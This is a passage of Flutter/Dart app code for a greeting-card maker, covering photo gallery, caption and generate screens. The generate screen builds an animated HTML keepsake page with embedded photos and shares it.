      padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 14),
      margin: const EdgeInsets.fromLTRB(20, 0, 20, 20),
    ));
  }

  @override
  Widget build(BuildContext context) {
    final o = appState.occasion!;
    return SafeArea(
      bottom: false,
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Padding(
          padding: const EdgeInsets.fromLTRB(24, 28, 24, 0),
          child: _SectionHeader(eyebrow: L.eyebrowGallery, title: L.titleGallery),
        ),
        Expanded(
          child: ListenableBuilder(
            listenable: appState,
            builder: (_, __) => GridView.builder(
              padding: const EdgeInsets.fromLTRB(20, 16, 20, 120),
              physics: const BouncingScrollPhysics(),
              gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                crossAxisCount: 2, crossAxisSpacing: 14, mainAxisSpacing: 14,
              ),
              itemCount: appState.images.length + 1,
              itemBuilder: (_, i) => i == appState.images.length
                ? _AddPhotoCell(accent: o.accent, onTap: _pick)
                : _PhotoCell(key: ValueKey(appState.images[i].path),
                    file: File(appState.images[i].path), index: i,
                    accent: o.accent, onRemove: () => appState.removeImage(i)),
            ),
          ),
        ),
        if (_uploading) _UploadProgress(
          label: _uploadLabel, accent: o.accent,
          current: _uploadCurrent, total: _uploadTotal,
        ),
      ]),
    );
  }
}

class _AddPhotoCell extends StatefulWidget {
  final Color accent;
  final VoidCallback onTap;
  const _AddPhotoCell({required this.accent, required this.onTap});
  @override
  State<_AddPhotoCell> createState() => _AddPhotoCellState();
}

class _AddPhotoCellState extends State<_AddPhotoCell> with SingleTickerProviderStateMixin {
  late final AnimationController _pulse;
  bool _pressed = false;

  @override
  void initState() {
    super.initState();
    _pulse = AnimationController(vsync: this, duration: const Duration(milliseconds: 1800))..repeat(reverse: true);
  }
  @override
  void dispose() { _pulse.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTapDown: (_) => setState(() => _pressed = true),
      onTapUp: (_) { setState(() => _pressed = false); widget.onTap(); },
      onTapCancel: () => setState(() => _pressed = false),
      child: AnimatedScale(
        scale: _pressed ? 0.94 : 1.0,
        duration: const Duration(milliseconds: 150),
        child: AnimatedBuilder(
          animation: _pulse,
          builder: (_, child) => Container(
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(20),
              gradient: LinearGradient(
                begin: Alignment.topLeft, end: Alignment.bottomRight,
                colors: [Color.lerp(const Color(0xFF120018), widget.accent.withOpacity(0.18), _pulse.value)!,
                         const Color(0xFF0A000F)],
              ),
              border: Border.all(
                color: widget.accent.withOpacity(0.2 + 0.2 * _pulse.value), width: 0.5,
              ),
            ),
            child: child,
          ),
          child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
            Container(
              width: 48, height: 48,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                color: widget.accent.withOpacity(0.12),
                border: Border.all(color: widget.accent.withOpacity(0.3)),
              ),
              child: Icon(Icons.add_photo_alternate_outlined, color: widget.accent, size: 24),
            ),
            const SizedBox(height: 12),
            Text('AJOUTER', style: GoogleFonts.cinzel(fontSize: 7, letterSpacing: 2, color: Colors.white30)),
            Text('زيد صورة', style: GoogleFonts.cormorantGaramond(fontSize: 12, color: Colors.white.withOpacity(0.2))),
          ]),
        ),
      ),
    );
  }
}

class _PhotoCell extends StatefulWidget {
  final File file;
  final int index;
  final Color accent;
  final VoidCallback onRemove;
  const _PhotoCell({super.key, required this.file, required this.index, required this.accent, required this.onRemove});
  @override
  State<_PhotoCell> createState() => _PhotoCellState();
}

class _PhotoCellState extends State<_PhotoCell> with SingleTickerProviderStateMixin {
  late final AnimationController _ctrl;

  @override
  void initState() {
    super.initState();
    _ctrl = AnimationController(vsync: this, duration: const Duration(milliseconds: 400))..forward();
  }
  @override
  void dispose() { _ctrl.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    return ScaleTransition(
      scale: CurvedAnimation(parent: _ctrl, curve: Curves.easeOutBack),
      child: Stack(fit: StackFit.expand, children: [
        ClipRRect(
          borderRadius: BorderRadius.circular(20),
          child: Image.file(widget.file, fit: BoxFit.cover),
        ),
        // Overlay gradient
        Positioned(
          bottom: 0, left: 0, right: 0,
          child: Container(
            height: 60,
            decoration: BoxDecoration(
              borderRadius: const BorderRadius.vertical(bottom: Radius.circular(20)),
              gradient: LinearGradient(
                begin: Alignment.topCenter, end: Alignment.bottomCenter,
                colors: [Colors.transparent, Colors.black.withOpacity(0.6)],
              ),
            ),
          ),
        ),
        // Numéro
        Positioned(
          bottom: 8, left: 10,
          child: Text((widget.index + 1).toString().padLeft(2, '0'),
            style: GoogleFonts.cinzel(fontSize: 11, color: Colors.white38, letterSpacing: 1)),
        ),
        // Bouton supprimer
        Positioned(
          top: 8, right: 8,
          child: GestureDetector(
            onTap: widget.onRemove,
            child: ClipRRect(
              borderRadius: BorderRadius.circular(20),
              child: BackdropFilter(
                filter: ImageFilter.blur(sigmaX: 8, sigmaY: 8),
                child: Container(
                  width: 30, height: 30,
                  decoration: BoxDecoration(
                    color: Colors.black.withOpacity(0.5), shape: BoxShape.circle,
                    border: Border.all(color: Colors.white.withOpacity(0.2)),
                  ),
                  child: const Icon(Icons.close_rounded, size: 14, color: Colors.white70),
                ),
              ),
            ),
          ),
        ),
      ]),
    );
  }
}

class _UploadProgress extends StatelessWidget {
  final String label;
  final Color accent;
  final int current;
  final int total;
  const _UploadProgress({required this.label, required this.accent, required this.current, required this.total});
  @override
  Widget build(BuildContext context) {
    return ClipRRect(
      child: BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 20, sigmaY: 20),
        child: Container(
          margin: const EdgeInsets.fromLTRB(20, 0, 20, 20),
          padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
          decoration: BoxDecoration(
            color: const Color(0xFF120018).withOpacity(0.8),
            borderRadius: BorderRadius.circular(16),
            border: Border.all(color: accent.withOpacity(0.3)),
          ),
          child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            Row(children: [
              SizedBox(width: 18, height: 18,
                child: CircularProgressIndicator(strokeWidth: 2, color: accent, backgroundColor: accent.withOpacity(0.15))),
              const SizedBox(width: 14),
              Text(label, style: GoogleFonts.cinzel(fontSize: 9, letterSpacing: 2, color: accent.withOpacity(0.9))),
              const Spacer(),
              Text('$current/$total', style: GoogleFonts.cinzel(fontSize: 9, color: Colors.white30)),
            ]),
            const SizedBox(height: 10),
            ClipRRect(
              borderRadius: BorderRadius.circular(4),
              child: LinearProgressIndicator(
                value: total > 0 ? current / total : 0,
                minHeight: 2, backgroundColor: Colors.white10,
                valueColor: AlwaysStoppedAnimation(accent),
              ),
            ),
          ]),
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════
//  SCREEN 3 — CAPTIONS
// ═══════════════════════════════════════════════════════════════
class CaptionsScreen extends StatelessWidget {
  const CaptionsScreen({super.key});
  @override
  Widget build(BuildContext context) {
    return SafeArea(
      bottom: false,
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Padding(
          padding: const EdgeInsets.fromLTRB(24, 28, 24, 0),
          child: _SectionHeader(eyebrow: L.eyebrowNarr, title: L.titleNarr),
        ),
        Expanded(
          child: ListenableBuilder(
            listenable: appState,
            builder: (_, __) {
              if (appState.images.isEmpty) {
                return Center(child: Column(mainAxisSize: MainAxisSize.min, children: [
                  Container(
                    width: 72, height: 72,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      color: Colors.white.withOpacity(0.04),
                      border: Border.all(color: Colors.white10),
                    ),
                    child: const Icon(Icons.photo_library_outlined, size: 32, color: Colors.white12),
                  ),
                  const SizedBox(height: 20),
                  Text(L.noPhotos, textAlign: TextAlign.center,
                    style: GoogleFonts.cormorantGaramond(fontSize: 16, fontStyle: FontStyle.italic, color: Colors.white.withOpacity(0.2), height: 1.7)),
                ]));
              }
              return ListView.builder(
                padding: const EdgeInsets.fromLTRB(24, 16, 24, 130),
                physics: const BouncingScrollPhysics(),
                itemCount: appState.images.length,
                itemBuilder: (_, i) => _CaptionCard(index: i),
              );
            },
          ),
        ),
      ]),
    );
  }
}

class _CaptionCard extends StatefulWidget {
  final int index;
  const _CaptionCard({required this.index});
  @override
  State<_CaptionCard> createState() => _CaptionCardState();
}

class _CaptionCardState extends State<_CaptionCard> with SingleTickerProviderStateMixin {
  late final TextEditingController _ctrl;
  late final AnimationController _anim;
  bool _focused = false;

  @override
  void initState() {
    super.initState();
    _ctrl = TextEditingController(text: appState.captions[widget.index] ?? '');
    _anim = AnimationController(vsync: this, duration: const Duration(milliseconds: 500));
    Future.delayed(Duration(milliseconds: widget.index * 80), () { if (mounted) _anim.forward(); });
  }
  @override
  void dispose() { _ctrl.dispose(); _anim.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    final o = appState.occasion!;
    return SlideTransition(
      position: Tween<Offset>(begin: const Offset(0.1, 0), end: Offset.zero)
          .animate(CurvedAnimation(parent: _anim, curve: Curves.easeOut)),
      child: FadeTransition(
        opacity: _anim,
        child: Focus(
          onFocusChange: (f) => setState(() => _focused = f),
          child: AnimatedContainer(
            duration: const Duration(milliseconds: 250),
            margin: const EdgeInsets.only(bottom: 24),
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(20),
              color: _focused ? o.accent.withOpacity(0.06) : const Color(0xFF0E0018),
              border: Border.all(color: _focused ? o.accent.withOpacity(0.4) : Colors.white10, width: _focused ? 1 : 0.5),
              boxShadow: _focused ? [BoxShadow(color: o.accent.withOpacity(0.15), blurRadius: 24)] : [],
            ),
            child: Row(crossAxisAlignment: CrossAxisAlignment.start, children: [
              // Numéro
              Padding(
                padding: const EdgeInsets.fromLTRB(16, 16, 0, 16),
                child: ShaderMask(
                  shaderCallback: (b) => LinearGradient(
                    colors: [o.accent.withOpacity(0.5), o.accent.withOpacity(0.1)],
                    begin: Alignment.topCenter, end: Alignment.bottomCenter,
                  ).createShader(b),
                  child: Text((widget.index + 1).toString().padLeft(2, '0'),
                    style: GoogleFonts.cinzel(fontSize: 36, fontWeight: FontWeight.w700, color: Colors.white, height: 1)),
                ),
              ),
              const SizedBox(width: 14),
              // Photo + texte
              Expanded(
                child: Padding(
                  padding: const EdgeInsets.fromLTRB(0, 14, 16, 14),
                  child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                    ClipRRect(
                      borderRadius: BorderRadius.circular(12),
                      child: Image.file(File(appState.images[widget.index].path),
                        height: 120, width: double.infinity, fit: BoxFit.cover),
                    ),
                    const SizedBox(height: 12),
                    TextField(
                      controller: _ctrl,
                      onChanged: (v) => appState.setCaption(widget.index, v),
                      maxLines: 2,
                      style: GoogleFonts.cormorantGaramond(fontSize: 16, fontStyle: FontStyle.italic, color: Colors.white70),
                      decoration: InputDecoration(
                        hintText: L.hintCaption, contentPadding: EdgeInsets.zero,
                        filled: false, border: InputBorder.none, enabledBorder: InputBorder.none, focusedBorder: InputBorder.none,
                      ),
                    ),
                  ]),
                ),
              ),
            ]),
          ),
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════
//  SCREEN 4 — GENERATE (SPECTACULAIRE)
// ═══════════════════════════════════════════════════════════════
class GenerateScreen extends StatefulWidget {
  const GenerateScreen({super.key});
  @override
  State<GenerateScreen> createState() => _GenerateScreenState();
}

class _GenerateScreenState extends State<GenerateScreen> with TickerProviderStateMixin {
  bool _generating = false;
  bool _done = false;
  double _progress = 0;
  String _label = '';

  late final AnimationController _orbitCtrl;
  late final AnimationController _pulseCtrl;
  late final AnimationController _glowCtrl;

  @override
  void initState() {
    super.initState();
    _orbitCtrl = AnimationController(vsync: this, duration: const Duration(seconds: 8))..repeat();
    _pulseCtrl = AnimationController(vsync: this, duration: const Duration(milliseconds: 1600))..repeat(reverse: true);
    _glowCtrl  = AnimationController(vsync: this, duration: const Duration(milliseconds: 2400))..repeat(reverse: true);
  }
  @override
  void dispose() { _orbitCtrl.dispose(); _pulseCtrl.dispose(); _glowCtrl.dispose(); super.dispose(); }

  static const _steps = [L.step0, L.step1, L.step2, L.step3, L.step4];

  Future<void> _generate() async {
    setState(() { _generating = true; _done = false; _progress = 0; });
    for (int i = 0; i <= 100; i += 2) {
      await Future.delayed(const Duration(milliseconds: 55));
      setState(() {
        _progress = i / 100;
        _label = _steps[(_progress * 4.99).floor().clamp(0, 4)];
      });
    }
    final o = appState.occasion!;
    final b64 = <String>[];
    for (final img in appState.images) {
      b64.add(base64Encode(await File(img.path).readAsBytes()));
    }
    final html = _buildUltraHtml(o, b64);
    final dir = await getTemporaryDirectory();
    final fname = (appState.name.isEmpty ? o.id : appState.name).replaceAll(' ', '_').toLowerCase();
    final file = File('${dir.path}/royale-$fname.html');
    await file.writeAsString(html);
    setState(() { _generating = false; _done = true; });
    Share.shareXFiles([XFile(file.path)],
      text: '${o.emoji} ${o.name} — ${o.nameAr}${appState.name.isNotEmpty ? " — ${appState.name}" : ""} ✨');
  }

  // ══════════════════════════════════════════════════════
  //  GENERATEUR HTML ULTRA-CINÉMATOGRAPHIQUE
  // ══════════════════════════════════════════════════════
  String _buildUltraHtml(Occasion o, List<String> b64) {
    final ah = '#${o.accent.value.toRadixString(16).substring(2).toUpperCase()}';
    final r = o.accent.red; final g = o.accent.green; final bv = o.accent.blue;
    final accentRgb = '$r,$g,$bv';
    final name = appState.name.isEmpty ? '' : appState.name;
    final displayName = name.isEmpty ? '${o.name}' : name;
    final hasPhotos = b64.isNotEmpty;

    // Slides avec captions
    final slides = b64.asMap().entries.map((e) {
      final cap = appState.captions[e.key] ?? '';
      final num = (e.key + 1).toString().padLeft(2, '0');
      return '''<div class="slide${e.key == 0 ? ' active' : ''}">
        <img src="data:image/jpeg;base64,${e.value}" alt="Photo $num" loading="lazy">
        <div class="slide-overlay"></div>
        <div class="slide-caption">
          <span class="cap-num">◈ $num / ${b64.length}</span>
          ${cap.isNotEmpty ? '<span class="cap-text">' + cap + '</span>' : ''}
        </div>
      </div>''';
    }).join('\n');

    final dots = b64.asMap().entries.map((e) =>
      '<div class="dot${e.key == 0 ? ' active' : ''}" onclick="goSlide(${e.key})"></div>'
    ).join('');

    final thumbs = b64.asMap().entries.map((e) =>
      '<div class="thumb${e.key == 0 ? ' active-thumb' : ''}" onclick="goSlide(${e.key})">'
      '<img src="data:image/jpeg;base64,${e.value}" loading="lazy"></div>'
    ).join('');

    // Mots du message avec animation staggerée
    final msgWords = appState.message.split(' ');
    final msgHtml = msgWords.asMap().entries.map((e) =>
      '<span class="mw" style="animation-delay:${0.8 + e.key * 0.05}s">${e.value}</span>'
    ).join(' ');

    return '''<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<title>${o.emoji} $displayName — Royale Moments</title>
<link rel="preconnect" href="https://fonts.googleapis.com"/>
<link href="https://fonts.googleapis.com/css2?family=Cinzel+Decorative:wght@700;900&family=Cormorant+Garamond:ital,wght@0,300;0,400;0,600;1,300;1,400&family=Dancing+Script:wght@600;700&family=Amiri:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet"/>
<style>
:root{
  --A: $ah;
  --Ar: $accentRgb;
  --gold: #FFD166;
  --rose: #FF4D9E;
  --violet: #9B5DE5;
  --cyan: #00F5D4;
  --ink: #04000A;
  --ink2: #0A0012;
  --ink3: #120020;
  --glass: rgba(255,255,255,.04);
  --white: #FFFEF8;
}
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
html{scroll-behavior:smooth;overflow-x:hidden}
body{
  background:var(--ink);color:var(--white);
  font-family:'Cormorant Garamond',serif;
  overflow-x:hidden;cursor:none;
  -webkit-font-smoothing:antialiased;
}

/* ── CUSTOM CURSOR ── */
#cur{position:fixed;width:12px;height:12px;border-radius:50%;background:var(--A);pointer-events:none;z-index:9999;transform:translate(-50%,-50%);box-shadow:0 0 14px var(--A),0 0 30px rgba(var(--Ar),.3);transition:width .15s,height .15s,opacity .2s;mix-blend-mode:screen}
#cur2{position:fixed;width:36px;height:36px;border-radius:50%;border:1px solid rgba(var(--Ar),.3);pointer-events:none;z-index:9998;transform:translate(-50%,-50%);transition:left .1s,top .1s}
@media(hover:none){#cur,#cur2{display:none}}

/* ── PARTICLES CANVAS ── */
#fx{position:fixed;inset:0;pointer-events:none;z-index:0}

/* ── LOADING SCREEN ── */
#loader{position:fixed;inset:0;background:var(--ink);z-index:10000;display:flex;flex-direction:column;align-items:center;justify-content:center;transition:opacity .8s,visibility .8s}
#loader.gone{opacity:0;visibility:hidden}
.loader-icon{font-size:56px;animation:lBob 1.2s ease-in-out infinite}
.loader-ring{width:80px;height:80px;border-radius:50%;border:2px solid transparent;border-top-color:var(--A);border-right-color:var(--A);animation:lSpin 1s linear infinite;margin-bottom:24px}
.loader-text{font-family:'Cinzel Decorative',serif;font-size:8px;letter-spacing:5px;color:rgba(var(--Ar),.5);animation:pulse 1s ease-in-out infinite}
@keyframes lSpin{to{transform:rotate(360deg)}}
@keyframes lBob{0%,100%{transform:translateY(0) scale(1)}50%{transform:translateY(-12px) scale(1.1)}}
@keyframes pulse{0%,100%{opacity:.4}50%{opacity:1}}

/* ── PAGE ── */
.page{position:relative;z-index:2}

/* ══════ HERO ══════ */
#hero{
  min-height:100vh;display:flex;flex-direction:column;
  align-items:center;justify-content:center;
  text-align:center;padding:48px 24px;
  position:relative;overflow:hidden;
}
/* Aurora blobs */
.aurora{position:absolute;border-radius:50%;filter:blur(100px);pointer-events:none;animation:aFloat ease-in-out infinite}
.a1{width:600px;height:600px;background:radial-gradient(var(--A),var(--violet));top:-180px;left:-200px;opacity:.22;animation-duration:22s}
.a2{width:500px;height:500px;background:radial-gradient(var(--cyan),var(--rose));bottom:-180px;right:-160px;opacity:.18;animation-duration:28s;animation-direction:reverse;animation-delay:-12s}
.a3{width:360px;height:360px;background:radial-gradient(var(--gold),var(--A));top:40%;left:50%;transform:translateX(-50%);opacity:.14;animation-duration:18s;animation-delay:-6s}
@keyframes aFloat{0%,100%{transform:translate(0,0) scale(1)}33%{transform:translate(28px,-22px) scale(1.05)}66%{transform:translate(-18px,18px) scale(.96)}}

/* Emoji hero */
.hero-emoji{
  font-size:clamp(72px,16vw,120px);display:block;
  filter:drop-shadow(0 0 30px var(--A)) drop-shadow(0 0 80px rgba(var(--Ar),.3));
  animation:eEntry 1s cubic-bezier(.34,1.56,.64,1) both,eBob 4s ease-in-out 1s infinite;
}
@keyframes eEntry{from{opacity:0;transform:scale(.2) rotate(-30deg)}to{opacity:1;transform:none}}
@keyframes eBob{0%,100%{transform:translateY(0) rotate(-2deg)}50%{transform:translateY(-20px) rotate(3deg)}}

/* Brand */
.brand{font-family:'Cinzel Decorative',serif;font-size:clamp(7px,1.5vw,10px);letter-spacing:8px;color:rgba(var(--Ar),.5);margin:18px 0 0;animation:fadeUp .6s ease .3s both}

/* Occasion label */
.occ-label{
  font-family:'Cinzel Decorative',serif;
  font-size:clamp(9px,2vw,13px);letter-spacing:5px;
  background:linear-gradient(90deg,var(--gold),var(--A),var(--rose));
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;
  animation:fadeUp .6s ease .4s both;margin-top:8px;
}

/* Nom principal */
.hero-name{
  font-family:'Dancing Script',cursive;
  font-size:clamp(64px,18vw,180px);line-height:.85;
  display:block;
  background:linear-gradient(135deg,var(--gold) 0%,var(--A) 25%,var(--rose) 55%,var(--violet) 75%,var(--cyan) 100%);
  background-size:300%;
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;
  animation:nameIn 1.2s cubic-bezier(.34,1.56,.64,1) .2s both, gradMove 8s linear infinite;
  filter:drop-shadow(0 0 50px rgba(var(--Ar),.25));
}
@keyframes nameIn{from{opacity:0;letter-spacing:-30px;transform:scale(1.3) translateY(20px)}}
@keyframes gradMove{to{background-position:-300% 0}}

/* Subtitle */
.hero-sub{
  font-family:'Amiri',serif;font-size:clamp(13px,2.5vw,18px);
  color:rgba(255,255,255,.4);letter-spacing:3px;direction:rtl;
  animation:fadeUp .6s ease .8s both;margin-top:8px;
}

/* Divider */
.div-line{
  width:min(300px,70vw);height:1px;
  background:linear-gradient(90deg,transparent,var(--gold),var(--A),var(--rose),var(--violet),transparent);
  margin:22px auto;animation:fadeUp .5s ease .9s both;
}

/* Message hero */
.hero-msg{
  max-width:620px;margin:16px auto;
  padding:28px 32px;
  background:rgba(var(--Ar),.04);
  border:0.5px solid rgba(var(--Ar),.15);
  border-radius:24px;
  backdrop-filter:blur(12px);
  animation:fadeUp .8s ease 1s both;
}
.hero-msg .mw{display:inline-block;opacity:0;animation:mwIn .5s ease forwards}
@keyframes mwIn{to{opacity:1}from{opacity:0;transform:translateY(10px)}}
.msg-text{font-family:'Amiri',serif;font-size:clamp(15px,3vw,22px);direction:rtl;text-align:right;color:rgba(255,255,255,.85);line-height:2}
.msg-sub{font-style:italic;font-size:clamp(12px,2vw,15px);color:rgba(255,255,255,.3);margin-top:10px;text-align:center}

/* Pour nom */
.hero-pour{
  font-family:'Cormorant Garamond',serif;font-style:italic;
  font-size:clamp(12px,2.5vw,17px);color:rgba(255,255,255,.35);
  letter-spacing:2px;animation:fadeUp .5s ease 1.2s both;margin-top:14px;
}

/* Scroll indicator */
.scroll-hint{margin-top:40px;animation:fadeUp .5s ease 1.6s both}
.scroll-hint span{font-size:24px;opacity:.25;animation:scBounce 2s ease-in-out infinite}
@keyframes scBounce{0%,100%{transform:translateY(0)}50%{transform:translateY(10px)}}

@keyframes fadeUp{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:none}}

/* ══════ PHOTOS ══════ */
#photos{padding:100px 20px;position:relative;display:${hasPhotos ? 'block' : 'none'}}
#photos::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse at 50% 0%,rgba(var(--Ar),.07),transparent 65%);pointer-events:none}

.sec-title{
  font-family:'Cinzel Decorative',serif;
  font-size:clamp(14px,3vw,22px);letter-spacing:3px;text-align:center;
  background:linear-gradient(90deg,var(--gold),var(--A),var(--violet));
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;
  margin-bottom:6px;
}
.sec-sub{display:block;font-family:'Amiri',serif;font-size:.65em;letter-spacing:3px;color:rgba(255,255,255,.25);-webkit-text-fill-color:rgba(255,255,255,.25);margin-top:4px;text-align:center}

/* Slideshow */
.ss-wrap{max-width:500px;margin:48px auto 0;position:relative}
.ss{width:100%;height:clamp(300px,55vw,460px);border-radius:28px;overflow:hidden;position:relative;
  box-shadow:0 0 0 1.5px rgba(var(--Ar),.25),0 0 80px rgba(var(--Ar),.18),0 40px 100px rgba(0,0,0,.8)}
/* Rotating border */
@property --angle{syntax:'<angle>';initial-value:0deg;inherits:false}
.ss::before{content:'';position:absolute;inset:-2px;border-radius:30px;z-index:10;pointer-events:none;
  background:conic-gradient(from var(--angle),transparent 70%,var(--A),var(--gold),var(--rose),transparent);
  animation:bSpin 4s linear infinite;
  -webkit-mask:linear-gradient(#fff 0 0) content-box,linear-gradient(#fff 0 0);
  -webkit-mask-composite:xor;mask-composite:exclude;padding:2px}
@keyframes bSpin{to{--angle:360deg}}

.slide{position:absolute;inset:0;opacity:0;transition:opacity 1s ease;display:flex;align-items:center;justify-content:center;background:#08001a}
.slide.active{opacity:1;z-index:2}
.slide img{width:100%;height:100%;object-fit:cover;transition:transform 10s ease}
.slide.active img{transform:scale(1.08)}
.slide-overlay{position:absolute;inset:0;background:linear-gradient(180deg,rgba(4,0,10,.1),rgba(4,0,10,.6));z-index:3}
.slide-caption{position:absolute;bottom:0;left:0;right:0;z-index:4;padding:32px 24px 22px;
  background:linear-gradient(0,rgba(4,0,10,.95),transparent)}
.cap-num{font-family:'Cinzel Decorative',serif;font-size:8px;letter-spacing:5px;color:rgba(var(--Ar),.65);display:block;margin-bottom:4px}
.cap-text{font-family:'Dancing Script',cursive;font-size:clamp(18px,4vw,28px);
  background:linear-gradient(90deg,var(--gold),var(--A));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}

/* Nav arrows */
.ss-nav{position:absolute;top:50%;transform:translateY(-50%);z-index:11;
  background:rgba(0,0,0,.35);border:1px solid rgba(var(--Ar),.3);border-radius:50%;
  width:44px;height:44px;display:flex;align-items:center;justify-content:center;
  cursor:pointer;backdrop-filter:blur(10px);transition:all .25s;font-size:20px;color:rgba(255,255,255,.7)}
.ss-nav:hover{background:rgba(var(--Ar),.25);border-color:var(--A);color:#fff}
#prev{left:-22px}#next{right:-22px}

/* Dots */
.ss-dots{display:flex;gap:8px;justify-content:center;margin-top:20px}
.dot{width:6px;height:6px;border-radius:50%;background:rgba(255,255,255,.2);cursor:pointer;transition:all .3s}
.dot.active{background:var(--A);width:24px;border-radius:3px;box-shadow:0 0 10px var(--A)}

/* Thumbnail reel */
.reel{display:flex;gap:10px;overflow-x:auto;padding:14px 2px 4px;scrollbar-width:none;margin-top:12px;scroll-snap-type:x mandatory}
.reel::-webkit-scrollbar{display:none}
.thumb{width:60px;height:60px;border-radius:12px;overflow:hidden;cursor:pointer;border:1.5px solid transparent;transition:all .3s;flex-shrink:0;scroll-snap-align:center;opacity:.5}
.thumb.active-thumb{border-color:var(--A);opacity:1;box-shadow:0 0 14px rgba(var(--Ar),.5)}
.thumb img{width:100%;height:100%;object-fit:cover}

/* ══════ MESSAGE SECTION ══════ */
#msg-sec{padding:100px 24px;max-width:720px;margin:0 auto;text-align:center}
.msg-box{
  background:rgba(var(--Ar),.04);border:1px solid rgba(var(--Ar),.12);
  border-radius:32px;padding:48px 40px;
  backdrop-filter:blur(16px);position:relative;overflow:hidden;
}
.msg-box::before{content:'❝';position:absolute;top:20px;left:22px;font-size:80px;color:rgba(var(--Ar),.05);font-family:'Amiri',serif;line-height:1}
.msg-box::after{content:'❞';position:absolute;bottom:8px;right:22px;font-size:80px;color:rgba(var(--Ar),.05);font-family:'Amiri',serif;line-height:1}
.msg-inner{font-family:'Amiri',serif;font-size:clamp(17px,3.5vw,26px);direction:rtl;text-align:right;color:rgba(255,255,255,.88);line-height:2.1;letter-spacing:.2px}
.msg-div{width:60px;height:1px;background:linear-gradient(90deg,transparent,var(--A),transparent);margin:24px auto}
.msg-foot{font-style:italic;font-size:clamp(12px,2vw,15px);color:rgba(255,255,255,.3)}

/* ══════ WISHES ══════ */
#wishes{padding:0 24px 100px;max-width:680px;margin:0 auto}
.wish-title{font-family:'Cinzel Decorative',serif;font-size:clamp(11px,2.5vw,16px);letter-spacing:4px;text-align:center;color:var(--gold);opacity:.7;margin-bottom:40px}
.wline{display:block;font-family:'Amiri',serif;font-size:clamp(15px,3vw,20px);direction:rtl;text-align:right;color:rgba(255,255,255,.68);line-height:2.1;padding:14px 0;border-bottom:1px solid rgba(255,255,255,.05);opacity:0;transform:translateX(32px);transition:opacity .65s ease,transform .65s ease}
.wline.in{opacity:1;transform:none}
.hl{color:var(--A);font-weight:700}
.hl2{color:var(--gold)}

/* ══════ FIREWORKS & EMOJI BURST ══════ */
.fw{position:fixed;border-radius:50%;pointer-events:none;z-index:99999;animation:fwFly var(--d) cubic-bezier(.16,1,.3,1) forwards}
@keyframes fwFly{0%{opacity:1;transform:translate(0,0) scale(1)}100%{opacity:0;transform:translate(var(--tx),var(--ty)) scale(0)}}

/* ══════ BIG BANG BUTTON ══════ */
.bang-wrap{text-align:center;margin:48px 0 32px}
.bang-btn{
  background:linear-gradient(135deg,rgba(var(--Ar),.15),rgba(var(--Ar),.04));
  border:1px solid rgba(var(--Ar),.45);border-radius:60px;
  padding:18px 40px;color:var(--A);
  font-family:'Cinzel Decorative',serif;font-size:clamp(9px,1.8vw,12px);letter-spacing:3px;
  cursor:pointer;transition:all .3s;
  box-shadow:0 0 30px rgba(var(--Ar),.12);backdrop-filter:blur(12px);
}
.bang-btn:hover{background:rgba(var(--Ar),.22);box-shadow:0 0 60px rgba(var(--Ar),.28);transform:scale(1.04)}

/* ══════ EMOJI ROW ══════ */
.emoji-row{display:flex;justify-content:center;gap:18px;font-size:28px;margin:24px 0;flex-wrap:wrap}
.emoji-row span{animation:eRowDance ease-in-out infinite}
@keyframes eRowDance{0%,100%{transform:translateY(0) rotate(-5deg) scale(1)}50%{transform:translateY(-12px) rotate(5deg) scale(1.12)}}

/* ══════ SIGNATURE ══════ */
.sig{text-align:center;padding:80px 24px 48px}
.sig-icon-row{display:flex;justify-content:center;gap:10px;margin-bottom:20px;flex-wrap:wrap}
.sig-icon{font-size:24px;animation:sigPulse ease-in-out infinite}
@keyframes sigPulse{0%,100%{transform:scale(1) rotate(0)}50%{transform:scale(1.18) rotate(8deg)}}
.sig-name{
  font-family:'Dancing Script',cursive;font-size:clamp(50px,14vw,130px);
  background:linear-gradient(90deg,var(--gold),var(--A),var(--rose),var(--violet));
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;
  display:block;line-height:1;margin-bottom:12px;
}
.sig-tag{font-family:'Amiri',serif;font-size:clamp(11px,2vw,14px);color:rgba(255,255,255,.25);letter-spacing:2px;direction:rtl}

/* ══════ FOOTER ══════ */
footer{text-align:center;padding:40px 20px 60px;border-top:1px solid rgba(255,255,255,.04)}
.ftxt{font-family:'Cinzel Decorative',serif;font-size:8px;letter-spacing:4px;color:rgba(255,255,255,.18)}
.fheart{color:var(--A);animation:hbeat .8s ease-in-out infinite}
@keyframes hbeat{0%,100%{transform:scale(1)}50%{transform:scale(1.35)}}

/* ══════ SCROLL REVEAL ══════ */
.rev{opacity:0;transform:translateY(36px);transition:opacity .75s ease,transform .75s ease}
.rev.in{opacity:1;transform:none}
.rev2{opacity:0;transform:scale(.95);transition:opacity .6s ease,transform .6s ease}
.rev2.in{opacity:1;transform:none}

/* ══════ GLASS PANEL ══════ */
